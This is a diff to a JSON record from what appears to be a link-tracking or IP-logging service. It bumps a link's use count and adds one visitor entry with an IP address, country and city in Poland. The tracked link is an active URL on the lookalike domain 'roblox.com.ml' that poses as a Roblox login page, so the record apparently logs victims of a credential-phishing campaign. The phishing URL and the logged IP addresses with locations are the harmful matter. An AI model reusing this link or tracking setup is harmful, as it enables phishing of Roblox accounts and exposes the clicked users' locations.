@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 284,
+    "useCount": 285,
     "createdBy": "admin",
     "clicks": [
       {
@@ -2384,6 +2384,14 @@
         "city": "Petaling Jaya",
         "flag": "🇲🇾",
         "countryCode": "MY"
+      },
+      {
+        "timestamp": 1777011337715,
+        "ip": "93.175.175.19",
+        "country": "Poland",
+        "city": "Puławy",
+        "flag": "🇵🇱",
+        "countryCode": "PL"
       }
     ]
   },
